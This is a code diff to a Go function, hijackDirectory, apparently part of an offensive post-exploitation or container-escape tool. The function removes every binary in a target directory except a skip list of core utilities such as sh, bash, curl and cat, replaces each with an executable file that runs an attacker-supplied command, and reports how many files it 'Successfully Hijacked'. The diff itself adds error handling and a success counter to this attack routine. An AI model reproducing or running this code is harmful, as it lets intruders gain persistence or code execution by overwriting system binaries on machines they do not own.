@@ -377,26 +377,29 @@ func hijackDirectory(dir, command string) {
 	if *verbosePtr {
 		fmt.Printf("[*] Number of binaries identified: %d\n", len(files))
 	}
-
+	hijackCount := 0
 	for _, file := range files {
+
 		if strings.ToLower(file.Name()) == "busybox" || strings.ToLower(file.Name()) == "sh" || strings.ToLower(file.Name()) == "dash" ||
 			strings.ToLower(file.Name()) == "ls" || strings.ToLower(file.Name()) == "echo" || strings.ToLower(file.Name()) == "chmod" ||
 			strings.ToLower(file.Name()) == "bash" || strings.ToLower(file.Name()) == "cp" || strings.ToLower(file.Name()) == "compgen" ||
 			strings.ToLower(file.Name()) == "rm" || strings.ToLower(file.Name()) == "mv" || strings.ToLower(file.Name()) == "which" ||
-			strings.ToLower(file.Name()) == "curl" || strings.ToLower(file.Name()) == "chown" {
-			if *verbosePtr {
-				fmt.Println("[*] Skipping: ", file.Name())
-			}
+			strings.ToLower(file.Name()) == "curl" || strings.ToLower(file.Name()) == "chown" || strings.ToLower(file.Name()) == "cat" {
+			fmt.Println("[*] Skipping-> ", file.Name())
 		} else {
+
 			if *verbosePtr {
 				fmt.Println("[*] Hijacking -> ", file.Name())
 			}
 
 			err := createFile(file.Name(), command)
 			if err != nil {
-				if *verbosePtr {
-					fmt.Println("[*] Error creating tmp file->", err)
+				fmt.Println("[*] Error creating tmp file->", err)
+				err = execShellCmd2("rm", file.Name())
+				if err != nil {
+					fmt.Println("[*] Error cleaning up->", err)
 				}
+				continue
 			}
 
 			err = execShellCmd2("rm", fmt.Sprintf("%s/%s", dir, file.Name()))
@@ -404,30 +407,37 @@ func hijackDirectory(dir, command string) {
 				if *verbosePtr {
 					fmt.Println("[*] Error deleting binary file->", err)
 				}
+				err = execShellCmd2("rm", file.Name())
+				if err != nil {
+					fmt.Println("[*] Error cleaning up->", err)
+				}
+				continue
 			}
 
 			err = copyFile(file.Name(), fmt.Sprintf("%s/%s", dir, file.Name()))
 			if err != nil {
-				if *verbosePtr {
-					fmt.Println("[*] Error copying file->", err)
-				}
-
+				fmt.Println("[*] Error copying file->", err)
+				continue
 			}
 
 			err = execShellCmd2("chmod", "+x", fmt.Sprintf("%s/%s", dir, file.Name()))
 			if err != nil {
-				if *verbosePtr {
-					fmt.Println("[*] Error chmoding file->", err)
-				}
+				fmt.Println("[*] Error chmoding file->", err)
+				continue
 			}
+
 			err = execShellCmd2("rm", file.Name())
 			if err != nil {
-				if *verbosePtr {
-					fmt.Println("[*] Error cleaning up->", err)
-				}
+				fmt.Println("[*] Error cleaning up->", err)
+				continue
+			}
+			if err == nil {
+				fmt.Println("[*] Successfully Hijacked -> ", file.Name())
+				hijackCount++
 			}
 		}
 	}
+	fmt.Println("[+] Files Hijacked: ", hijackCount)
 }
 
 func findDomainSockets(path string) {
